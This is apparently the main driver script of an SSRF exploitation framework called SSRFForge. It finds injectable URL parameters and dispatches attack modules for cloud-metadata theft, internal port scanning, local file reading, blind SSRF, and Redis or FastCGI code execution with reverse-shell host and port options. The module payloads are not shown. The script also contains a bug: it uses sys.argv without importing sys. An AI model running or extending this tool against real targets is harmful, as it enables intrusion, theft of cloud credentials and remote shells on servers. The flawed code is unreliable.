import asyncio
import argparse
from rich.console import Console
from rich.panel import Panel
from art import tprint

from core.engine import HTTPEngine
from core.parser import RequestParser
from modules.discovery import Discovery
from modules.exploit_manager import ExploitManager
from modules.cloud_metadata import CloudMetadata
from modules.port_scan import PortScan
from modules.file_read import FileRead
from modules.blind_ssrf import BlindSSRF
from modules.rce_redis import RedisExploit
from modules.rce_fastcgi import FastCGIExploit
from utils.logger import Logger
from utils.reporter import ReportGenerator

console = Console()

def display_banner():
    tprint("SSRFForge", font="slant")
    console.print(Panel("[bold cyan]Advanced SSRF Exploitation Framework[/bold cyan]\n[italic white]Developed by @ismailtasdelen[/italic white]", expand=False))

async def main():
    display_banner()
    parser = argparse.ArgumentParser(description="SSRFForge - Advanced SSRF Exploitation Framework")
    parser.add_argument("-u", "--url", help="Target URL to test for SSRF")
    parser.add_argument("-r", "--request", help="Burp Suite request file")
    parser.add_argument("-m", "--module", choices=["cloud", "portscan", "fileread", "blind", "redis", "fastcgi"], help="Specific exploitation module to run")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-lhost", "--lhost", help="Local host for reverse shells (Redis RCE)")
    parser.add_argument("-lport", "--lport", help="Local port for reverse shells (Redis RCE)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-o", "--output", choices=["json", "md"], help="Output report format")
    
    args = parser.parse_args()
    
    if not args.url and not args.request:
        parser.print_help()
        return

    engine = HTTPEngine(proxy=args.proxy)
    exploit_manager = ExploitManager(engine)
    
    # Register modules
    exploit_manager.register_module("cloud", CloudMetadata)
    exploit_manager.register_module("portscan", PortScan)
    exploit_manager.register_module("fileread", FileRead)
    exploit_manager.register_module("blind", BlindSSRF)
    exploit_manager.register_module("redis", RedisExploit)
    exploit_manager.register_module("fastcgi", FastCGIExploit)

    target_url = args.url
    if args.request:
        Logger.info(f"Parsing Burp request from {args.request}")
        try:
            with open(args.request, "r") as f:
                parsed_req = RequestParser.parse_raw(f.read())
                target_url = RequestParser.construct_url(parsed_req["headers"], parsed_req["path"])
                Logger.info(f"Target URL constructed: {target_url}")
        except FileNotFoundError:
            Logger.error(f"Request file not found: {args.request}")
            return

    reporter = ReportGenerator(target_url)
    Logger.info(f"Starting discovery on {target_url}")
    
    suspicious_params = Discovery.find_suspicious_params(target_url)
    if suspicious_params:
        Logger.success(f"Found suspicious parameters: {', '.join(suspicious_params)}")
        
        if args.module:
            for param in suspicious_params:
                Logger.info(f"Testing parameter: [bold]{param}[/bold]")
                # Build test URL with placeholder
                from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
                parsed = urlparse(target_url)
                query = parse_qs(parsed.query)
                original_value = query[param][0]
                query[param] = ["SSRF"]
                new_query = urlencode(query, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                
                module_kwargs = {"lhost": args.lhost, "lport": args.lport}
                result = await exploit_manager.run_exploit(args.module, test_url, **module_kwargs)
                
                if result:
                    reporter.add_finding(args.module, result, params={param: "SSRF"})

            if args.output:
                if args.output == "json":
                    path = reporter.save_json()
                else:
                    path = reporter.save_markdown()
                Logger.success(f"Report saved to: {path}")
    else:
        Logger.warning("No suspicious parameters found via heuristics.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red][!][/bold red] Interrupted by user. Exiting...")
    except Exception as e:
        Logger.error(f"An unexpected error occurred: {e}")
        import traceback
        if "-v" in sys.argv:
            traceback.print_exc()
